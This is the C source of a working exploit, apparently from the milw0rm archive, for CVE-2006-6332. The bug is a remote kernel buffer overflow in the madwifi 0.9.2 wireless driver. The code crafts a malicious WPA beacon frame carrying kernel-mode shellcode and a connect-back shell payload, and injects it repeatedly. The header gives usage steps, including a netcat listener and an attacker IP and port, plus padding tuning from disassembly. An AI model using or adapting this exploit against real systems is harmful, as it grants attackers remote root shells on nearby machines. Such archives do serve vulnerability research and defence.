/* ----  madwifi WPA/RSN IE remote kernel buffer overflow  ------
 * expoit code by:   sgrakkyu <at> antifork.org -- 10/1/2007
 * 
 * CVE: 2006-6332 (Laurent BUTTI, Jerome RAZNIEWSKI, Julien TINNES)
 * 
 * (for wpa)
 * ....
 * memcpy(buf, se->se_wpa_ie, se->se_wpa_ie[1] + 2) 
 * ....
 * ....
 * the function re-uses args in the stack before returning so we 
 * can\'t trash them overwriting. 
 * Different compiled module [ex. different version of gcc] may require 
 * a different pad value.. (see -g option)
 *
 * ex:
 * on one terminal runs: nc -l -p 31337 
 * phi:~/kexec/lorcon# gcc -g -o madwifi_exp madwifi_exp.c -lorcon
 * phi:~/kexec/lorcon# wlanconfig ath1 create wlandev wifi0 wlanmode monitor
 * phi:~/kexec/lorcon# ifconfig ath1 up
 * phi:~/kexec/lorcon# ./madwifi_exp -i ath1 -d madwifing -a 10.0.0.1 -p 31337
 * [opt-ip]: 10.0.0.1
 * [opt-port]: 31337
 * [opt-iface]: ath1
 * [opt-driver]: madwifing
 * [opt-jump]: 0xffffe777
 * [pad]: 36
 *
 * [*][Low Avail Byte]: 103
 * [*][High Avail Byte]: 47
 * [*][u_code[] (high)size]: 91, [ring0_code[] (low)size]: 47
 * [*][ patching jump ]: [eba7]
 * [*][Payload space]: 192
 * [*][beacon_frame-80211]=54
 * [*][beacon_WPA_IE_lenght]: 198
 *
 * [printing frame - start]
 *   80 00 00 00 ff ff ff ff ff ff cc cc cc cc cc cc
 *   cc cc cc cc cc cc 00 00 00 00 00 00 00 00 00 00
 *   64 00 01 00 00 03 41 41 41 01 08 82 84 8b 96 0c
 *   18 30 48 03 01 0b dd c6 00 50 f2 01 01 00 90 90
 *   90 90 90 90 90 90 90 90 90 90 31 c0 89 c3 40 40
 *   ....
 *   ....
 *
 *
 * Tuning option:
 * - depending on gcc version/optimization we have to change the padding of vector
 *   payload, take a look to the following disassembly of the module wlan.o compiled
 *   with gcc-4.0 (kernel compiled for i586):
 *
 *  00015a49 <giwscan_cb>:
 *  15a49:       55                      push   %ebp
 *  15a4a:       57                      push   %edi
 *  15a4b:       56                      push   %esi
 *  15a4c:       53                      push   %ebx
 *  15a4d:       81 ec c4 00 00 00       sub    $0xbc,%esp <--16+188=[204]
 *  .........
 *  .........
 *  .........
 *  15fc3:       8d 54 24 12             lea    0xa(%esp),%edx <-esp+[10]
 *  15fc7:       89 d7                   mov    %edx,%edi
 *  ...
 *  ...
 *  15fd5:       f3 a5                   rep movsl %ds:(%esi),%es:(%edi)
 *     
 * 
 * this is not a rule, check gcc generated code to calculate correct pad value :
 * [startbuf-ret] = (16 + 188 - 10) = 194 byte
 * PAD = 194 - SHELLCODE_SPACE - IEWPAheader(code,len,oui) = 194 - 150 - 8 = 36
 * ( -g 36 would be the choice in that case)
 *   
 *   NOTE: 1) the remote box must call the ioctl() SIOCGIWSCAN
 *            for ex. when the iface gets up or during iwlist iface scanning
 *            command
 *
 *         2) if you need more space for kernel mode code you can rely on
 *             struct ieee80211_scan_entry paramter of gwiscan_cb()
 *             function to access the real frame (a trivial joke)
 *
 *         3) i had no time to test this exploit on other boxes..:
 *            tested only on:  Slackware 10 -  madwifi 0.9.2
 *                             Kubuntu - kernel 2.6.17 - madwifi 0.9.2
 *
 *
 *  TNX TNX TNX  twiz <at> antifork.org
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <getopt.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <tx80211.h>
#include <tx80211_packet.h>
#include <linux/wireless.h>
#include <arpa/inet.h>


/* 2.6.17 VSYSCALL: for >= 2.6.18 without fixed-vsyscall entry use kernel hardcoded value */
#define VSYSCALL_JMP_ESP_OFFSET   0xffffe777
#define IE_ZERO 0x00000000

#define FIX_BYTE(base,offset,byte)   *(((unsigned char*)base) + offset) = byte;
#define FIX_WORD(base,offset,word)   *((unsigned short *)((unsigned char*)base + offset)) = word;
#define FIX_DWORD(base,offset,dword) *((unsigned int *)((unsigned char*)base + offset)) = dword;

/* shellcode max buffer */
/* 8 bytes used for lenght + oui */
#define SHELLCODE_SPACE  150  
#define PAD_SPACE        36

#define PAYLOAD_SPACE    (SHELLCODE_SPACE + pad_space + 4 + 2)
#define TOTAL_PACKET_LEN (sizeof(beacon_80211_wpa) -1 + PAYLOAD_SPACE)

/* exp option */
char *iface = NULL;  /* needed */
char *driver = NULL; /* needed */
char *ip = NULL;     /* needed */
short port = 0;      /* needed */
unsigned int jmp_address = VSYSCALL_JMP_ESP_OFFSET;
unsigned int pad_space = PAD_SPACE;



/* ----------------------------------- */

#define SUB_OFFSET_PATCH 8
char ring0_code[]=
 \"\\xe8\\x00\\x00\\x00\\x00\"      //call   8048359 <main+0x21>
 \"\\x5e\"                      //pop    %esi
 \"\\x81\\xee\\x88\\x00\\x00\\x00\"  //sub    $0x88,%esi  /* PATCH */
 \"\\x31\\xc0\"                  //xor    %eax,%eax
 \"\\xb0\\x04\"                  //mov    $0x4,%al
 \"\\x01\\xc4\"                  //add    %eax,%esp
 \"\\x83\\x3c\\x24\\x73\"          //cmp    $0x73,%esp
 \"\\x75\\xf8\"                  //jne    8048364 <main+0x2c>
 \"\\x83\\x7c\\x24\\x0c\\x7b\"      //cmpl   $0x7b,0xc(%esp)
 \"\\x75\\xf1\"                  //jne    8048364 <main+0x2c>
 \"\\x29\\xc4\"                  //sub    %eax,%esp
 \"\\x8b\\x7c\\x24\\x0c\"          //mov    0xc(%esp),%edi
 \"\\x89\\x3c\\x24\"              //mov    %edi,(%esp)
 \"\\x31\\xc9\"                  //xor    %ecx,%ecx
 \"\\xb1\\x5b\"                  //mov    $0x5b,%cl /* FIX */
 \"\\xf3\\xa4\"                  //rep movsb %ds:(%esi),%es:(%edi)
 \"\\xcf\";                     //iret


/* connect back */
#define IP_OFFSET   35
#define PORT_OFFSET 44
char u_code[] = 
\"\\x31\\xc0\\x89\\xc3\\x40\\x40\\xcd\\x80\\x39\\xc3\\x74\\x03\\x31\\xc0\\x40\\xcd\\x80\" /* fork */
\"\\x6a\\x66\\x58\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5d\"              
\"\\xbe\"
\"\\xf5\\xff\\xff\\xfe\"  // ~ip
\"\\xf7\\xd6\\x56\\x66\\xbd\"
\"\\x69\\x7a\"          // port
\"\\x0f\\xcd\\x09\\xdd\\x55\\x43\\x6a\\x10\\x51\\x50\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x87\\xd9\"   
\"\\x5b\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\"  
\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\xeb\\xdf\";         


/* 802.11header + WPA IE prolog */
#define WPA_LEN_OFFSET 55
#define CHANNEL     11
char beacon_80211_wpa[] = 
\"\\x80\"              // management frame / subtype beacon
\"\\x00\"              // flags
\"\\x00\\x00\"          // duration
\"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\"  // destination addr
\"\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  // src address
\"\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  // bbsid
\"\\x00\\x00\"          // seq
\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" // timestamp
\"\\x64\\x00\"          // interval
\"\\x01\\x00\"          // caps
\"\\x00\\x03\\x41\\x41\\x41\"  // ssid Information Element
\"\\x01\\x08\\x82\\x84\\x8b\\x96\\x0c\\x18\\x30\\x48\" // rates Information Element
\"\\x03\\x01\\x0B\"     // channel Information Element (11)
\"\\xdd\\xc6\"         // WPA Information Element (priv ID + len) (0xc6 = 0xc0 + 6) /* PATCH */
\"\\x00\\x50\\xf2\\x01\\x01\\x00\";     // oui + type + version (first 6 byte of len)

#define JUMP_OFFSET_PATCH 1
char jmp_back[]=\"\\xeb\\x00\";

/* ----------------------------------- */


void usage(char *prog)
{
  printf(\"[usage]: %s (-i iface) (-d drivername) (-a ip) (-p port) [-g pad] [-j jump_address]\\n\", prog);
}

unsigned char *build_frame()
{
  int i,j;
  char *frame = malloc(TOTAL_PACKET_LEN);
  char *ptr = frame;
  
  unsigned int hsb = sizeof(ring0_code)-1;
  unsigned int lsb =  SHELLCODE_SPACE - hsb;
  printf(\"[*][low-kcode]: %d\\n[*][high-ucode]: %d\\n\", 
         lsb, hsb);
  
  printf(\"[*][u_code[] (high)size]: %d, [ring0_code[] (low)size]: %d\\n\", 
         sizeof(u_code)-1, sizeof(ring0_code)-1);

  /* fix jump */
  int b = -4 - pad_space - (sizeof(jmp_back)-1) - (sizeof(ring0_code)-1);
  FIX_BYTE(jmp_back, JUMP_OFFSET_PATCH, b);

  /* fix ring0_code/u_code displacement */
  unsigned int sub = 5 + (sizeof(u_code)-1);
  FIX_BYTE(ring0_code, SUB_OFFSET_PATCH, sub);

  printf(\"[*][payload space]: %d\\n\", PAYLOAD_SPACE);

  /* fix beacon_80211_wpa: WPA len */
  FIX_BYTE(beacon_80211_wpa, WPA_LEN_OFFSET, PAYLOAD_SPACE + 6);
  printf(\"[*][beacon_WPA_IE_lenght]: %u\\n\", 
                  (unsigned char)beacon_80211_wpa[WPA_LEN_OFFSET]);

  /* fill frame */
  memset(frame, 0x00, TOTAL_PACKET_LEN);

  memcpy(ptr, beacon_80211_wpa, sizeof(beacon_80211_wpa)-1);
  ptr += (sizeof(beacon_80211_wpa)-1);

  memset(ptr, 0x90, lsb - (sizeof(u_code)-1));
  ptr += (lsb - (sizeof(u_code)-1));
  
  memcpy(ptr, u_code, sizeof(u_code) -1);
  ptr += (sizeof(u_code) -1);

  memcpy(ptr, ring0_code, sizeof(ring0_code)-1);
  ptr += sizeof(ring0_code)-1;
  
  for(i=0; i<pad_space; i+=4) 
    *((unsigned int *)(ptr + i)) = (IE_ZERO+(i/4));

  ptr += pad_space;

  *((unsigned int *)(ptr)) = jmp_address;
  ptr += 4;

  memcpy(ptr, jmp_back, sizeof(jmp_back)-1);
  ptr += sizeof(jmp_back)-1;

  return (unsigned char*)frame; 
}

void print_frame(unsigned char *frame, unsigned int size)
{
  int i;
  printf(\"\\n[printing frame - start]\\n  \");
  for(i=1; i<=size; i++)
  {
    printf(\"%02x \", frame[i-1]);
    if((i % 16) == 0)
      printf(\"\\n  \");
  }
  printf(\"\\n[printing frame - end]\\n\");
}

void parse_arg(int argc, char **argv)
{
  int opt;
  struct in_addr in;
  while( (opt=getopt(argc, argv, \"j:i:a:p:d:g:\")) != EOF)
  {
    switch(opt)
    {
      case \'j\':
        jmp_address = strtoll(optarg, NULL, 16);
        break;
      case \'a\':
        ip = strdup(optarg);
        inet_aton(ip, &in); 
        FIX_DWORD(u_code, IP_OFFSET, ~(in.s_addr));    
        break;
      case \'p\':
        port = atoi(optarg);
        FIX_WORD(u_code, PORT_OFFSET, port); 
        break;
      case \'d\':
        driver = strdup(optarg);
        break;
      case \'i\':
        iface = strdup(optarg);
        break;
      case \'g\':
        pad_space = atoi(optarg);
        break;
      default:
        usage(argv[0]);
        exit(1);
    } 
  }
}


int main(int argc, char *argv[])
{
  int i=0;
  struct tx80211 in_tx;
  struct tx80211_packet in_packet;
  int drivertype;
  
  parse_arg(argc, argv);                

  if(!iface || !driver || !ip || !port)
  {
    usage(argv[0]);
    exit(1);
  }

  printf( \"\\n\\nMadwifi 0.9.2 WPA/RSN IE buffer overflow\\n\\t exploit code: sgrakkyu <at> antifork.org\\n\"
          \"-------------------- **** ------------------\\n\"
          \"[opt-ip]: %s\\n[opt-port]: %d\\n[opt-iface]: %s\\n[opt-driver]: %s\\n[opt-jump]: 0x%08x\\n[pad]: %d\\n\"
          \"-------------------- **** ------------------\\n\\n\",
          ip, port, iface, driver, jmp_address, pad_space);

  unsigned char *frame = build_frame();
  print_frame(frame, TOTAL_PACKET_LEN);

  /* Use the command-line argument as the desired driver type */
  drivertype = tx80211_resolvecard(driver);

  /* Validate the driver name specified */
  if (drivertype == INJ_NODRIVER) 
  {
    fprintf(stderr, \"Driver name not recognized.\\n\");
    return -1;
  }

  if (tx80211_init(&in_tx, iface, drivertype) < 0) {
    fprintf(stderr, \"Error initializing drive \\\"%s\\\".\\n\", argv[1]);
    return -1;
  }

  if ((tx80211_getcapabilities(&in_tx) & TX80211_CAP_CTRL) == 0) 
  {
    fprintf(stderr, \"Driver does not support transmitting control frames.\\n\");
    return -1;
  }

  if (tx80211_setchannel(&in_tx, CHANNEL) < 0) 
  {
    fprintf(stderr, \"Error setting channel.\\n\");
    return 1;
  }

  if (tx80211_open(&in_tx) < 0) 
  {
    fprintf(stderr, \"Unable to open interface %s.\\n\", in_tx.ifname);
    return 1;
  }

  /* Initialized in_packet with packet contents and length of the packet */
  in_packet.packet = frame;
  in_packet.plen = TOTAL_PACKET_LEN;

  printf(\"[sending packets]: about 10 a second\\n\");

  while(i < 10000)
  {
    /* Transmit the packet */
    if (tx80211_txpacket(&in_tx, &in_packet) < 0) 
    {
      fprintf(stderr, \"Unable to transmit packet.\\n\");
      perror(\"txpacket\");
      return 1;
    }
    i++;
    usleep(100000);
  }
  /* Close the socket after transmitting the packet */
  tx80211_close(&in_tx);

  return 0;
}

// milw0rm.com [2007-03-01]
